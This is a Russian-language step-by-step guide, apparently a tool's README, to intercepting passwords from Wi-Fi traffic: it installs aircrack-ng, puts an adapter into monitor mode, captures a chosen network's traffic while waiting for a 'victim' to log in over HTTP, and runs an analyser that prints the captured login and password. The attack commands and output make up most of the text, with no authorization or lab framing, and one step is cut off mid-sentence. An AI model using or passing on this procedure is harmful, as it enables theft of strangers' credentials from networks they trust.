## Перехват паролей из Wi-Fi трафика

### Требования
1. ОС основанная на Linux.
2. Wi-Fi модуль с поддержкой режима мониторинга.
3. Пакетный менеджер `apt` для установки зависимостей.
4. Все команды из инструкции выполняются от имени администратора (`root`).

### Подготовка
#### Установка необходимых програм
Если Вы используете ОС Kali Linux, то можно сразу перейти к шагу `4`. 
1. Установите пакет `wireless-tools`: 
    ```bash
    apt install wireless-tools
    ```
2. Установите пакет `aircrack-ng`:
    ```bash
    apt install aircrack-ng
    ```
3. Установите компилятор `g++` не ниже 9-ой версии:
    ```bash
    apt install g++-9
    ```
4. Скачайте скрипт для анализа дампов сети и перейдите в папку со скриптом: 
    ```bash
    git clone https://github.com/hackallcode/cap_analyzer.git
    cd cap_analyzer
    ```
5. Скомпилируем скрипт:
    ```bash
    g++-9 -std=c++17 cap_analyzer.cpp -o cap_analyzer.o
    ```
6. Создадим папку, где будем складывать дампы сети:
    ```bash
    mkdir dumps
    ```
#### Подготовка модуля
1. Для начала надо определить название интерфейса нашего Wi-Fi модуля:
    ```bash
    airmon-ng
    ```
    В результате выполнения команды будет что-то похожее на это:
    ```
    PHY	Interface	Driver		Chipset
    
    Warn ON: USB
    phy1	wlan0		mt76x0u		Ralink Technology, Corp. MT7610U
    ```
    В нашем случае интересуемое название: `wlan0`.
2. Убиваем процессы, которые нам могут помешать, если они есть:
    ```bash
    airmon-ng check kill
    ```
3. Далее необходимо включить режим наблюдения на выбранном интерфейсе:
    ```bash
    airmon-ng start wlan0
    ```
4. Проверяем, что все хорошо:
    ```bash
    iwconfig
    ```
    Результат выполнения будет похож на это:
    ```
    eth0      no wireless extensions.
    
    lo        no wireless extensions.
    
    wlan0mon  IEEE 802.11  Mode:Monitor  Frequency:2.457 GHz  Tx-Power=14 dBm   
        Retry short limit:7   RTS thr:off   Fragment thr:off
        Power Management:on
    ```
    Строка `Mode:Monitor` гласит о том, что адаптер в режиме мониторинга.
    Также теперь наш интерфейс называется `wlan0mon`. Запоминаем это для дальнейшего использования.
### Перехват
1. Переходим в папку для 
2. Для начала посмотрим, какие сети есть неподалеку:
    ```bash
    airodump-ng wlan0mon
    ```
    Сверху будут отображаться Wi-Fi сети, снизу Wi-Fi клиенты. 
    Выбираем сеть и канал этой сети, которые будет атаковать.
3. Начинаем собирать трафик с выбранной сети.
    ```bash
    airodump-ng wlan0mon --essid <SSID> -c <Channel> -w <filename>
    ```
    *... Ждем, пока жертва посетит HTTP сайт и введет логин и пароль ...*
    Нажимаем `ctrl + c`, когда хотим закончить сбор данных.
4. Далее запускаем скрипт для анализа трафика:
    ```bash
    ./cap_analyzer.o <filename.cap> -u <attacked_url> -- <field_name_1> <field_name_2>
    ```
    В результате получим что-то подобное:
    ```
    URI = http.hackallcode.ru
    
    Method = POST
    login = hackallcode
    password = Qwerty123!
    ```
    Вот что и требовалось получить!
